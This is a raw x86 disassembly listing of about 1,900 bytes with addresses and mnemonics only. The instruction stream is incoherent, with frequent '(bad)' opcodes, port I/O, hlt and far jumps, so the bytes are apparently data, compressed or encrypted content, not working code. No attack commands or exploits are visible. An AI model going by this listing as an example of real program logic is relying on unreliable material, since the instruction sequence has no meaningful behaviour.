  411c03:	push   0x332c76db
  411c08:	mov    eax,ds:0xc8d05f80
  411c0d:	call   0x71a1:0x7011e9c8
  411c14:	lods   al,BYTE PTR ds:[esi]
  411c15:	jle    0x411c41
  411c17:	dec    edi
  411c18:	xchg   edi,eax
  411c19:	push   esp
  411c1a:	mov    ch,0x5b
  411c1c:	(bad)  [esi]
  411c1e:	mov    al,0xa3
  411c20:	scas   al,BYTE PTR es:[edi]
  411c21:	adc    DWORD PTR [ebp+esi*1+0x59adab4d],esp
  411c28:	mov    al,ds:0x17b050ad
  411c2d:	adc    DWORD PTR [edi+eax*2],esi
  411c30:	xor    esi,edx
  411c32:	mov    eax,0xc8a4b5b1
  411c37:	imul   eax,eax,0x3e98174f
  411c3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c3e:	lods   eax,DWORD PTR ds:[esi]
  411c3f:	mov    ebp,edx
  411c41:	outs   dx,DWORD PTR ds:[esi]
  411c42:	sub    al,0x65
  411c44:	aas    
  411c45:	cwde   
  411c46:	adc    DWORD PTR [ebx*2-0x4a4893fb],edx
  411c4d:	enter  0xfd6d,0x47
  411c51:	mov    ebp,0xb4b89190
  411c56:	aad    0x6e
  411c58:	inc    esp
  411c59:	cmp    bh,BYTE PTR [eax-0x25f03b5c]
  411c5f:	nop
  411c60:	outs   dx,BYTE PTR ds:[esi]
  411c61:	mov    eax,ds:0x6928e8d8
  411c66:	cmp    al,0xde
  411c68:	sbb    al,0xf0
  411c6a:	add    eax,ecx
  411c6c:	add    al,BYTE PTR [eax+0x61]
  411c6f:	push   ss
  411c70:	and    esi,DWORD PTR [esi+0x2f6a0e85]
  411c76:	xchg   ebp,eax
  411c77:	mov    DWORD PTR [ebx],esp
  411c79:	hlt    
  411c7a:	pop    ss
  411c7b:	push   cs
  411c7c:	sbb    al,0x5b
  411c7e:	mov    ebx,0xe95f0095
  411c83:	jno    0x411c91
  411c85:	loopne 0x411cc5
  411c87:	jae    0x411c4b
  411c89:	push   cs
  411c8a:	and    BYTE PTR [esi+0x77],ch
  411c8d:	mov    dl,0x59
  411c8f:	shl    BYTE PTR [ebx-0x69558628],0x28
  411c96:	mov    dh,0xd4
  411c98:	xor    cl,bl
  411c9a:	inc    esi
  411c9b:	xchg   esi,eax
  411c9c:	rol    BYTE PTR [esp+ebp*2+0x9],0x25
  411ca1:	xor    BYTE PTR [ecx+0x15d6ed2f],ah
  411ca7:	pop    ebp
  411ca8:	fadd   st,st(2)
  411caa:	mov    ebp,0x22bc49fa
  411caf:	stos   BYTE PTR es:[edi],al
  411cb0:	lds    esi,FWORD PTR [ebp-0x5e249130]
  411cb6:	jge    0x411c38
  411cb8:	ja     0x411d29
  411cba:	push   edx
  411cbb:	loopne 0x411cc1
  411cbd:	mov    esp,0xbb42ed82
  411cc2:	adc    edi,DWORD PTR [ebx-0x2c]
  411cc5:	pop    edi
  411cc6:	mov    es,WORD PTR [eax+ebp*8]
  411cc9:	inc    ecx
  411cca:	or     ebx,esp
  411ccc:	fidiv  DWORD PTR [esi-0xae3fc72]
  411cd2:	jo     0x411c54
  411cd4:	lahf   
  411cd5:	hlt    
  411cd6:	je     0x411d01
  411cd8:	les    esi,FWORD PTR [esi+0x764410d0]
  411cde:	and    dh,BYTE PTR [edi]
  411ce0:	pop    ss
  411ce1:	inc    edi
  411ce2:	mov    ah,0x5d
  411ce4:	pop    edx
  411ce5:	sub    bl,BYTE PTR [ebx]
  411ce7:	adc    al,0xc
  411ce9:	out    0xf4,al
  411ceb:	hlt    
  411cec:	ficom  DWORD PTR [ecx]
  411cee:	iret   
  411cef:	lods   eax,DWORD PTR ds:[esi]
  411cf0:	mov    edi,eax
  411cf2:	mov    dh,0x5e
  411cf4:	jne    0x411d48
  411cf6:	pop    eax
  411cf7:	mov    esp,0xd620ebb3
  411cfc:	mov    ah,0x2d
  411cfe:	mov    ah,0x92
  411d00:	mov    bl,0xb8
  411d02:	lods   al,BYTE PTR ds:[esi]
  411d03:	push   ebx
  411d04:	hlt    
  411d05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d06:	aas    
  411d07:	pop    ecx
  411d08:	push   0x86b696dc
  411d0d:	fsubr  QWORD PTR [edx-0x168acabf]
  411d13:	daa    
  411d14:	shr    BYTE PTR [ebp+0x63],cl
  411d17:	pop    ebx
  411d18:	mov    ds:0x2d6b4daf,eax
  411d1d:	sbb    ebp,DWORD PTR [eax+edx*2]
  411d20:	popa   
  411d21:	inc    edi
  411d22:	adc    eax,0x848df95b
  411d27:	jo     0x411d13
  411d29:	add    BYTE PTR [edx+0x2a9cbcf9],al
  411d2f:	sbb    ebx,DWORD PTR [eax+ebp*1+0x55]
  411d33:	jae    0x411db4
  411d35:	inc    esi
  411d36:	retf   
  411d37:	mov    ah,0x76
  411d39:	add    al,0x70
  411d3b:	pop    ebx
  411d3c:	inc    esp
  411d3d:	xlat   BYTE PTR ds:[ebx]
  411d3e:	pop    edi
  411d3f:	mov    bh,0xd
  411d41:	mov    eax,0xb052a2bd
  411d46:	push   eax
  411d47:	push   ss
  411d48:	(bad)  
  411d49:	xchg   ebp,eax
  411d4a:	mov    BYTE PTR [eax-0x2ee89291],dh
  411d50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d51:	sbb    cl,BYTE PTR [ebx-0x66fcb4a4]
  411d57:	into   
  411d58:	adc    BYTE PTR [edi+0x3335882e],dh
  411d5e:	mov    ds:0x5bee626,al
  411d63:	fs stos BYTE PTR es:[edi],al
  411d65:	sbb    eax,0x1dbd4e05
  411d6a:	cmp    BYTE PTR [edx-0x16344e50],0xc9
  411d71:	rol    DWORD PTR [edi+eiz*1],1
  411d74:	out    dx,eax
  411d75:	les    ecx,FWORD PTR [ebp+0x146fedb6]
  411d7b:	pushf  
  411d7c:	dec    edx
  411d7d:	rol    BYTE PTR [esi-0x7521046a],0x8d
  411d84:	ficomp DWORD PTR [esi+0x28]
  411d87:	pop    ecx
  411d88:	not    BYTE PTR [ecx+0x43]
  411d8b:	popa   
  411d8c:	inc    ebx
  411d8d:	rol    BYTE PTR [esi],1
  411d8f:	shr    BYTE PTR [esi],1
  411d91:	xchg   esi,eax
  411d92:	cmp    eax,0xc491474
  411d97:	mov    ch,0xdb
  411d99:	push   edx
  411d9a:	sti    
  411d9b:	or     dl,BYTE PTR [ebp-0x70557296]
  411da1:	sub    al,0xb4
  411da3:	or     BYTE PTR [esi-0x470a4311],dl
  411da9:	dec    ecx
  411daa:	ins    BYTE PTR es:[edi],dx
  411dab:	sub    BYTE PTR [esi+0x6d],0x9
  411daf:	js     0x411d45
  411db1:	pop    edi
  411db2:	sub    bh,dl
  411db4:	ins    BYTE PTR es:[edi],dx
  411db5:	pushf  
  411db6:	aad    0xb8
  411db8:	xor    eax,0xf2595010
  411dbd:	inc    esi
  411dbe:	sbb    al,0xcf
  411dc0:	ins    BYTE PTR es:[edi],dx
  411dc1:	(bad)  [esi+0x8c18505]
  411dc7:	data16 xor cl,0x47
  411dcb:	pop    ebx
  411dcc:	ins    DWORD PTR es:[edi],dx
  411dcd:	ins    DWORD PTR es:[edi],dx
  411dce:	or     eax,0x6e740000
  411dd3:	xchg   edi,eax
  411dd4:	fdiv   QWORD PTR [ebx-0x26]
  411dd7:	add    DWORD PTR [ebp+0x2d9df555],esi
  411ddd:	pop    ecx
  411dde:	xchg   ebx,eax
  411ddf:	adc    al,0x36
  411de1:	outs   dx,BYTE PTR ds:[esi]
  411de2:	push   ebp
  411de3:	mov    DWORD PTR [ebp-0x6a],ecx
  411de6:	clc    
  411de7:	inc    edx
  411de8:	daa    
  411de9:	or     eax,0x2dbb5b0b
  411dee:	lods   al,BYTE PTR ds:[esi]
  411def:	xchg   edx,eax
  411df0:	gs hlt 
  411df2:	neg    DWORD PTR [edx]
  411df4:	push   eax
  411df5:	pop    ebp
  411df6:	pop    esi
  411df7:	out    0x85,eax
  411df9:	push   esi
  411dfa:	mov    ah,0x5b
  411dfc:	std    
  411dfd:	push   esp
  411dfe:	adc    bh,0xb7
  411e01:	mov    al,ds:0x896d8db6
  411e06:	in     eax,dx
  411e07:	jl     0x411dc3
  411e09:	retf   
  411e0a:	xor    eax,0xe808518d
  411e0f:	jbe    0x411e25
  411e11:	ins    BYTE PTR es:[edi],dx
  411e12:	aaa    
  411e13:	add    edi,DWORD PTR [edx]
  411e15:	pop    ds
  411e16:	cwde   
  411e17:	ror    BYTE PTR [ecx+esi*4],1
  411e1a:	mov    cl,0x5b
  411e1c:	popa   
  411e1d:	pop    ebx
  411e1e:	fcomp  st(5)
  411e20:	pop    edi
  411e21:	(bad)  
  411e22:	dec    ebx
  411e23:	enter  0x16c2,0x11
  411e27:	adc    bl,ch
  411e29:	sub    al,bl
  411e2b:	outs   dx,BYTE PTR ds:[esi]
  411e2c:	fwait
  411e2d:	cmc    
  411e2e:	test   eax,0x28c9f032
  411e33:	bound  edx,QWORD PTR [esi-0x26]
  411e36:	inc    esp
  411e37:	jo     0x411ea3
  411e39:	push   edx
  411e3a:	mov    cl,0x43
  411e3c:	jb     0x411e55
  411e3e:	(bad)  
  411e3f:	int    0xd5
  411e41:	rol    dl,cl
  411e43:	and    eax,0xad651934
  411e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e49:	jmp    0xa60265a9
  411e4e:	dec    BYTE PTR [ebx]
  411e50:	ds movs DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411e53:	sahf   
  411e54:	xlat   BYTE PTR ds:[ebx]
  411e55:	cmp    cl,al
  411e57:	push   ss
  411e58:	aad    0x6e
  411e5a:	xchg   ebp,eax
  411e5b:	xor    bl,dl
  411e5d:	sti    
  411e5e:	dec    esi
  411e5f:	daa    
  411e60:	lods   eax,DWORD PTR ds:[esi]
  411e61:	add    ebx,eax
  411e63:	push   ecx
  411e64:	sbb    DWORD PTR [esi+0x11],esp
  411e67:	ret    0x381b
  411e6a:	dec    edx
  411e6b:	mov    bh,0x85
  411e6d:	test   DWORD PTR [esi],ebp
  411e6f:	jae    0x411e7d
  411e71:	pop    es
  411e72:	daa    
  411e73:	mov    edi,0xd15f04aa
  411e78:	cs mov ah,0x0
  411e7b:	and    eax,0xe0484b5b
  411e80:	ss inc eax
  411e82:	mov    ah,0xb2
  411e84:	inc    edx
  411e85:	int3   
  411e86:	dec    ecx
  411e87:	aas    
  411e88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e89:	inc    edi
  411e8a:	mov    bl,BYTE PTR [edx*1-0x74ccac30]
  411e91:	push   0xf2403b68
  411e96:	les    ebx,FWORD PTR [esi-0x2fa11578]
  411e9c:	adc    al,0x70
  411e9e:	mov    ds:0x4b878e4,eax
  411ea3:	xchg   esp,eax
  411ea4:	retf   
  411ea5:	mov    dh,0xed
  411ea7:	cmp    BYTE PTR [eax-0x4ba2ac39],0xac
  411eae:	rcl    DWORD PTR [edi*4-0x3d3ebb8f],0x85
  411eb6:	shr    dl,1
  411eb8:	mov    WORD PTR [ebx-0x16],es
  411ebb:	ins    DWORD PTR es:[edi],dx
  411ebc:	(bad)  [esi-0x13fa5c2c]
  411ec2:	add    al,BYTE PTR ds:0xf89a77b7
  411ec8:	or     edx,DWORD PTR [edi]
  411eca:	xchg   esi,eax
  411ecb:	push   ss
  411ecc:	pop    esp
  411ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ece:	push   ebp
  411ecf:	mov    edx,ebx
  411ed1:	dec    edx
  411ed2:	mov    ds,WORD PTR [ebp+0x1ad942db]
  411ed8:	adc    ecx,ebx
  411eda:	xlat   BYTE PTR ds:[ebx]
  411edb:	sub    bh,BYTE PTR [ecx-0x60]
  411ede:	es sub ch,0x5d
  411ee2:	mov    ebx,0x5f146f80
  411ee7:	inc    esp
  411ee8:	shl    DWORD PTR [esi-0x616dd7f3],1
  411eee:	sbb    eax,0x7cbb61c5
  411ef3:	mov    ds:0xaa6669b9,eax
  411ef8:	add    BYTE PTR [edx],al
  411efa:	out    0x8d,al
  411efc:	out    0x8a,al
  411efe:	(bad)  
  411f00:	lea    ebx,[ebx+0x5b]
  411f03:	or     DWORD PTR [eax-0x18],0x1
  411f07:	jmp    0x13413305
  411f0c:	test   DWORD PTR [ebx-0x25],ecx
  411f0f:	repnz xchg ecx,eax
  411f11:	inc    esp
  411f12:	add    BYTE PTR [esi+0x35b0142f],bh
  411f18:	jne    0x411eb9
  411f1a:	xor    al,0xdb
  411f1c:	xchg   BYTE PTR [edx+0x4ca17c5b],cl
  411f22:	cmp    al,0x8d
  411f24:	add    esi,DWORD PTR ds:0x976d04cb
  411f2a:	dec    edx
  411f2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f2c:	xor    eax,0x29bcf736
  411f31:	inc    eax
  411f32:	sbb    ebp,DWORD PTR [edx-0x270c08ca]
  411f38:	sub    BYTE PTR [eax+0x48],ah
  411f3b:	mov    ds:0x20db681,eax
  411f40:	sub    al,0x20
  411f42:	(bad)  
  411f43:	out    dx,al
  411f44:	jecxz  0x411f16
  411f46:	jnp    0x411efc
  411f48:	cs mov ch,0x46
  411f4b:	fcomp  QWORD PTR [esi-0x381f3b05]
  411f51:	jle    0x411f07
  411f53:	sub    eax,0x5626f244
  411f58:	gs xchg edi,eax
  411f5a:	and    BYTE PTR [esi+0x142d51b6],0x76
  411f61:	pop    ebx
  411f62:	add    edx,DWORD PTR [esi]
  411f64:	ficom  DWORD PTR [edx-0x3ea892e5]
  411f6a:	retf   
  411f6b:	pop    es
  411f6c:	sub    esi,DWORD PTR [edx-0x56]
  411f6f:	jnp    0x411faa
  411f71:	mov    dh,0xb6
  411f73:	ins    DWORD PTR es:[edi],dx
  411f74:	mov    edi,0x8605fb56
  411f79:	lds    esp,FWORD PTR [eax+0x2011ae05]
  411f7f:	shl    BYTE PTR [edx+0x49b6ddad],1
  411f85:	or     BYTE PTR [edi-0x61a39f8d],ah
  411f8b:	sub    DWORD PTR [ebx-0x74e927e0],edi
  411f91:	hlt    
  411f92:	ds test eax,ecx
  411f95:	cmp    BYTE PTR [esi+0xf1b0bb5],al
  411f9b:	adc    al,dl
  411f9d:	and    al,0x4b
  411f9f:	xchg   esp,eax
  411fa0:	es mov al,0xef
  411fa3:	fdivr  QWORD PTR [edx]
  411fa5:	sub    ch,BYTE PTR [esi]
  411fa7:	rcl    DWORD PTR [edx+0x9],1
  411faa:	out    dx,eax
  411fab:	xchg   edx,eax
  411fac:	bound  esi,QWORD PTR [eax+0x1da0e801]
  411fb2:	add    BYTE PTR [ebx+0x1c],ch
  411fb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411fb6:	fmul   QWORD PTR [edi]
  411fb8:	push   ss
  411fb9:	mov    dh,0xad
  411fbb:	pop    ebp
  411fbc:	fchs   
  411fbe:	xor    al,0x47
  411fc0:	xchg   ebp,eax
  411fc1:	mov    WORD PTR [ebx-0x3d7b1427],?
  411fc7:	adc    dl,BYTE PTR [edi-0x34cab7ca]
  411fcd:	mov    dh,0x41
  411fcf:	mov    ds:0xda02f43d,eax
  411fd4:	lea    ecx,[ebp-0x6bd230a3]
  411fda:	in     eax,0x20
  411fdc:	dec    ebx
  411fdd:	in     eax,dx
  411fde:	(bad)  
  411fdf:	(bad)  
  411fe0:	or     esp,ebp
  411fe2:	push   esi
  411fe3:	sbb    BYTE PTR [edi+0x18],ah
  411fe6:	and    BYTE PTR ds:0x6c2d2ef1,al
  411fec:	or     esi,DWORD PTR [eax+0x5d]
  411fef:	sub    al,0xf5
  411ff1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ff2:	mov    DWORD PTR [ecx-0x6d],0xba023512
  411ff9:	stos   BYTE PTR es:[edi],al
  411ffa:	cli    
  411ffb:	jb     0x411ffb
  411ffd:	mov    ah,0x10
  411fff:	adc    al,0x6e
  412001:	or     eax,0xb9e86b61
  412006:	ja     0x411fd8
  412008:	add    al,0x71
  41200a:	mov    eax,ds:0x81b32e4a
  41200f:	rcr    DWORD PTR [edx],0x85
  412012:	test   DWORD PTR [ebp+0x2cdfcdcd],ecx
  412018:	push   ds
  412019:	dec    ecx
  41201a:	push   edx
  41201b:	jl     0x412093
  41201d:	mov    cl,0x54
  41201f:	pop    eax
  412020:	mov    al,ds:0xfa64b00a
  412025:	clc    
  412026:	jg     0x411fca
  412028:	and    esp,eax
  41202a:	mov    dh,0x39
  41202c:	ficom  DWORD PTR [ebx+0x4]
  41202f:	je     0x411ff3
  412031:	jbe    0x411fe4
  412033:	mov    cl,0x50
  412035:	or     DWORD PTR ds:0x1e73d80,0xb0b6e2a3
  41203f:	test   al,0x23
  412041:	mov    ch,0xfd
  412043:	cmp    esi,DWORD PTR [edx+0x16]
  412046:	adc    DWORD PTR [edx],eax
  412048:	fisubr DWORD PTR [esi-0x6f]
  41204b:	lods   eax,DWORD PTR ds:[esi]
  41204c:	or     bl,BYTE PTR [edi-0x7692d29e]
  412052:	jbe    0x4120bf
  412054:	fcom   DWORD PTR [edi-0x55350dc8]
  41205a:	adc    edi,DWORD PTR [ebp-0x2f]
  41205d:	and    al,bl
  41205f:	outs   dx,BYTE PTR ds:[esi]
  412060:	xchg   BYTE PTR [esp+ebp*4-0x371071ad],bh
  412067:	push   edi
  412068:	adc    bl,BYTE PTR [ebx+0x29]
  41206b:	push   0x2
  41206d:	xchg   ebx,eax
  41206e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41206f:	cmp    ecx,esi
  412071:	pop    es
  412072:	xchg   al,ah
  412074:	rol    dl,cl
  412076:	push   cs
  412077:	push   ss
  412078:	mov    ds:0xc5e23be3,al
  41207d:	sub    ch,0x46
  412080:	pop    ss
  412081:	or     al,0x60
  412083:	mov    ah,0x5c
  412085:	and    cl,ch
  412087:	cmp    al,0x68
  412089:	mov    ebp,DWORD PTR [ebp+0x30936709]
  41208f:	cmp    eax,0xd6db83c0
  412094:	push   esi
  412095:	mov    DWORD PTR [eax-0x33],esi
  412098:	fucomp st(3)
  41209a:	mov    ch,bl
  41209c:	cmp    eax,0xa8a6b637
  4120a1:	push   eax
  4120a2:	xchg   ecx,eax
  4120a3:	and    esp,ebx
  4120a5:	imul   edx,ebp,0x8055e989
  4120ab:	sub    ch,BYTE PTR [edi+ebp*8-0x71]
  4120af:	sub    edi,DWORD PTR [ebx+ebx*1-0x49]
  4120b3:	add    dh,BYTE PTR [eax+eiz*4+0x4874efa9]
  4120ba:	sub    edx,DWORD PTR [esi+eax*2+0x20]
  4120be:	bound  eax,QWORD PTR [ebx]
  4120c0:	add    BYTE PTR [edx],ch
  4120c2:	jle    0x412101
  4120c4:	inc    edi
  4120c5:	jo     0x412122
  4120c7:	call   0x4b8db05d
  4120cc:	sbb    eax,0xb68860f7
  4120d1:	test   DWORD PTR [ebp+0xa6f4e0a],eax
  4120d7:	sbb    DWORD PTR [edx+0x6b6ab64b],edx
  4120dd:	pop    ss
  4120de:	(bad)
  4120e2:	xor    bl,BYTE PTR [ecx-0x48b414f0]
  4120e8:	push   edx
  4120e9:	shl    dh,1
  4120eb:	shl    BYTE PTR [esi+ebx*1-0x5d],0x23
  4120f0:	sbb    ah,BYTE PTR [ebx+0xb6b7689]
  4120f6:	add    ah,BYTE PTR [ebp+0x34]
  4120f9:	mov    DWORD PTR [esi],edx
  4120fb:	or     BYTE PTR [eax+0x2],cl
  4120fe:	push   0x23b2428d
  412103:	pop    ss
  412104:	in     eax,0x5b
  412106:	fistp  DWORD PTR [eax-0x2]
  412109:	cmp    eax,DWORD PTR [edx+0x52]
  41210c:	cmp    eax,ebp
  41210e:	pop    ebp
  41210f:	hlt    
  412110:	add    BYTE PTR [eax],bl
  412112:	sbb    dl,ah
  412114:	push   esp
  412115:	sar    BYTE PTR [ebp+0x31],0x94
  412119:	in     eax,0x94
  41211b:	jno    0x412186
  41211d:	fcmovnu st,st(0)
  41211f:	lds    esi,FWORD PTR [edx+0xd02cc2a]
  412125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412126:	out    dx,eax
  412127:	push   esp
  412128:	push   edx
  412129:	sub    al,0x94
  41212b:	outs   dx,DWORD PTR ds:[esi]
  41212c:	mov    cl,BYTE PTR [eax-0x59144700]
  412132:	adc    DWORD PTR [ebx-0x3d2495d8],esp
  412138:	jg     0x412104
  41213a:	cwde   
  41213b:	xchg   ebp,eax
  41213c:	jp     0x412176
  41213e:	ins    DWORD PTR es:[edi],dx
  41213f:	fcmovnb st,st(6)
  412141:	push   esi
  412142:	clc    
  412143:	pop    esp
  412144:	addr16 int3 
  412146:	out    0xaa,al
  412148:	mov    ds:0xb45eb5c,al
  41214d:	push   eax
  41214e:	mov    ebx,0xb9f7f280
  412153:	clc    
  412154:	add    DWORD PTR [ebx+0x55],ebp
  412157:	mov    ch,0x4d
  412159:	and    al,0xb4
  41215b:	or     al,0xf2
  41215d:	pop    es
  41215e:	dec    ebp
  41215f:	adc    eax,DWORD PTR [edi+esi*4]
  412162:	jbe    0x412154
  412164:	and    bl,dl
  412166:	or     ebx,DWORD PTR [esi+0x28]
  412169:	fidiv  WORD PTR [ecx+0x3b5736dd]
  41216f:	in     eax,0xb3
  412171:	mov    dl,al
  412173:	ss jb  0x4121cf
  412176:	jne    0x412113
  412178:	push   0xffffffdb
  41217a:	adc    DWORD PTR [eax-0x6f76daf8],edi
  412180:	adc    DWORD PTR [edx+0x6d85d097],ecx
  412186:	imul   ebx,ebp,0x17
  412189:	daa    
  41218a:	push   ebx
  41218b:	lock or eax,0xaaea5c31
  412191:	mov    eax,0x1a08bc
  412196:	cmp    bl,BYTE PTR es:[ebp-0x5c8a4dc1]
  41219d:	jo     0x4121fa
  41219f:	lods   eax,DWORD PTR ds:[esi]
  4121a0:	sbb    al,0x3b
  4121a2:	push   edx
  4121a3:	jno    0x41218a
  4121a5:	stos   DWORD PTR es:[edi],eax
  4121a6:	ja     0x412213
  4121a8:	retf   
  4121a9:	mov    edi,0xf92c7db0
  4121ae:	enter  0xa9a9,0xc3
  4121b2:	hlt    
  4121b3:	add    BYTE PTR [ecx-0x59f4ff84],bl
  4121b9:	mov    fs,WORD PTR [edx-0x2f6b52f5]
  4121bf:	push   ebp
  4121c0:	(bad)  
  4121c1:	dec    ebp
  4121c2:	(bad)  
  4121c3:	(bad)  
  4121c5:	lea    eax,[ebp+0x97abb96]
  4121cb:	(bad)  
  4121cc:	dec    ebx
  4121cd:	or     eax,DWORD PTR [esi+esi*4+0x4]
  4121d1:	lock loope 0x4121aa
  4121d4:	push   esp
  4121d5:	cmp    eax,0x25536be9
  4121da:	(bad)  
  4121db:	aad    0x5e
  4121dd:	fwait
  4121de:	sub    BYTE PTR [esi+0x11],dh
  4121e1:	sub    edx,DWORD PTR ds:0xbb414d0b
  4121e7:	add    BYTE PTR [edi],dl
  4121e9:	xchg   esi,eax
  4121ea:	push   0x1a
  4121ec:	ins    BYTE PTR es:[edi],dx
  4121ed:	push   0x36c7e149
  4121f2:	fimul  DWORD PTR [esi-0x4838bc26]
  4121f8:	add    ecx,DWORD PTR [edi]
  4121fa:	sti    
  4121fb:	sbb    BYTE PTR [ebx],0x89
  4121fe:	xor    BYTE PTR [esi+0x44],0xdc
  412202:	outs   dx,BYTE PTR ds:[esi]
  412203:	out    0x86,eax
  412205:	sbb    al,0xed
  412207:	ffree  st(1)
  412209:	add    eax,0x49b09a16
  41220e:	cmp    eax,0x87fb3fb8
  412213:	mov    dh,0x1b
  412215:	pop    ebx
  412216:	push   edi
  412217:	(bad)  
  412218:	fsubr  DWORD PTR [esi-0x6c]
  41221b:	mov    ds:0x1bf5922d,al
  412220:	mov    al,ds:0xf229add
  412225:	sub    BYTE PTR [ebx],cl
  412227:	je     0x4121aa
  412229:	pop    edi
  41222a:	or     DWORD PTR [edx-0x6995f493],eax
  412230:	das    
  412231:	rcl    edx,cl
  412233:	mov    bh,0x6d
  412235:	imul   esp,DWORD PTR [ecx+0x3b91c149],0x68b97aee
  41223f:	pusha  
  412240:	xor    DWORD PTR ds:0x1305135b,eax
  412246:	in     al,0x5
  412248:	repnz pop es
  41224a:	outs   dx,BYTE PTR ds:[esi]
  41224b:	or     eax,0x53f2b5aa
  412250:	push   ebp
  412251:	sti    
  412252:	xor    BYTE PTR [ecx],al
  412254:	or     ebp,DWORD PTR [ecx+edx*1]
  412257:	sahf   
  412258:	rcl    DWORD PTR [ecx-0x21],1
  41225b:	jno    0x4122b8
  41225d:	push   ss
  41225e:	push   0x1b
  412260:	sub    DWORD PTR [ecx-0x40057c4d],esp
  412266:	(bad)  
  412267:	rcl    BYTE PTR [edx+0x3],cl
  41226a:	pop    eax
  41226b:	add    dl,cl
  41226d:	inc    esi
  41226e:	bound  edi,QWORD PTR [eax]
  412270:	adc    BYTE PTR [ebp+0x6b],dh
  412273:	sbb    edx,DWORD PTR [esi-0x51f7fd1e]
  412279:	push   edx
  41227a:	fdivr  DWORD PTR [edx+0x38c9d880]
  412280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412281:	cmp    eax,0x6bbe9e83
  412286:	pop    ss
  412287:	or     dl,BYTE PTR [edi+0x16a4e3d]
  41228d:	mov    ss,WORD PTR [edx-0x25f4a969]
  412293:	(bad)  
  412294:	ret    0x8b72
  412297:	pop    es
  412298:	jle    0x4122e9
  41229a:	ss es mov cl,0x95
  41229e:	jbe    0x412309
  4122a0:	mov    eax,ds:0x7ab262dd
  4122a5:	dec    edx
  4122a6:	cli    
  4122a7:	(bad)  
  4122a8:	stos   BYTE PTR es:[edi],al
  4122a9:	jecxz  0x4122e4
  4122ab:	inc    edi
  4122ac:	(bad)  
  4122ad:	dec    esi
  4122ae:	ins    BYTE PTR es:[edi],dx
  4122af:	fisttp DWORD PTR [edx]
  4122b1:	jno    0x412281
  4122b3:	cwde   
  4122b4:	jmp    0x41226e
  4122b6:	stc    
  4122b7:	in     al,dx
  4122b8:	outs   dx,BYTE PTR ds:[esi]
  4122b9:	or     eax,0x7366c2d1
  4122be:	jge    0x4122d3
  4122c0:	shr    BYTE PTR [edi],0x3c
  4122c3:	(bad)  
  4122c4:	mov    dh,0x16
  4122c6:	mov    cl,0xd5
  4122c8:	ja     0x4122b2
  4122ca:	out    dx,eax
  4122cb:	dec    edi
  4122cc:	pop    ss
  4122cd:	in     al,0x5b
  4122cf:	pop    ss
  4122d0:	add    eax,0xc3f12d37
  4122d5:	or     ecx,eax
  4122d7:	xor    eax,0x2c2e82a2
  4122dc:	ins    BYTE PTR es:[edi],dx
  4122dd:	(bad)  [ecx+esi*8-0x62]
  4122e1:	mov    BYTE PTR [ebx+0x44],bh
  4122e4:	mov    bh,0x85
  4122e6:	jbe    0x412353
  4122e8:	pop    ebp
  4122e9:	pusha  
  4122ea:	and    BYTE PTR [edi-0x6d],al
  4122ed:	jge    0x41233b
  4122ef:	adc    DWORD PTR [esi],ecx
  4122f1:	mov    eax,ds:0xe1500b62
  4122f6:	adc    edx,DWORD PTR [edi-0x6de974c8]
  4122fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122fd:	fidiv  DWORD PTR [esi]
  4122ff:	push   ss
  412300:	sbb    ch,BYTE PTR [ecx+ebp*4+0x57]
  412304:	xchg   DWORD PTR [eax],esi
  412306:	and    cl,bh
  412308:	shl    DWORD PTR [esi],1
  41230a:	pop    edx
  41230b:	add    edx,esi
  41230d:	cmp    ecx,DWORD PTR [ebx-0x25]
  412310:	and    al,0x2e
  412312:	ins    BYTE PTR es:[edi],dx
  412313:	or     ecx,DWORD PTR [ebp-0x6e]
  412316:	adc    DWORD PTR [ebp+eiz*4-0x53],ecx
  41231a:	mov    WORD PTR [eax],ss
  41231c:	push   ds
  41231d:	mov    esp,0xd542c415
  412322:	and    esi,DWORD PTR [esp+ebp*1-0x5e]
  412326:	test   DWORD PTR [esi],edx
  412328:	ror    BYTE PTR [edi],1
  41232a:	jle    0x41233b
  41232c:	loop   0x4123a5
  41232e:	stos   BYTE PTR es:[edi],al
  41232f:	or     DWORD PTR [edx+0x67f44e55],edi
  412335:	fwait
  412336:	rcr    BYTE PTR [esi],cl
  412338:	fdivr  DWORD PTR [edx]
  41233a:	or     BYTE PTR [eax+0x6c],ch
  41233d:	(bad)  
  41233e:	xchg   esi,eax
  41233f:	sub    BYTE PTR [ebx-0x5],ch
  412342:	imul   esp,DWORD PTR [ebx-0x55],0xffffffdd
  412346:	cmp    BYTE PTR [esi],0x79
  412349:	aam    0xe2
  41234b:	xchg   esp,eax
  41234c:	ret    
  41234d:	xor    dh,cl
  41234f:	aam    0xa1
  412351:	(bad)  [edi+0x7a]
  412354:	aas    
  412355:	shr    DWORD PTR [esi+0x47],1
  412358:	sti    
  412359:	mov    ebp,0xdb85821d
  41235e:	adc    dh,BYTE PTR [ecx+0x68]
  412361:	stos   BYTE PTR es:[edi],al
  412362:	sar    edx,1
  412364:	pop    esi
  412365:	dec    BYTE PTR [eax]
  412367:	clc    
  412368:	aad    0x86
  41236a:	inc    esi
  41236b:	lods   al,BYTE PTR ds:[esi]
  41236c:	dec    ebx
  41236d:	adc    al,0x23
  41236f:	sti    
  412370:	pop    esp
  412371:	fdiv   DWORD PTR [esi]
  412373:	mov    edx,0x97ebe55
  412378:	pop    ecx
  412379:	inc    edx
  41237a:	cmp    al,BYTE PTR [ebx-0x31]
  41237d:	sbb    DWORD PTR [edx-0x60],0x68
  412381:	leave  
  412382:	cs imul ah
  412385:	push   ebp
  412386:	mov    ch,0xb1
  412388:	mov    al,0x16
  41238a:	shl    BYTE PTR [esi-0x48],0x3c
  41238e:	inc    edx
  41238f:	cs ins DWORD PTR es:[edi],dx
  412391:	sub    al,0xd1
  412393:	jbe    0x4123cc
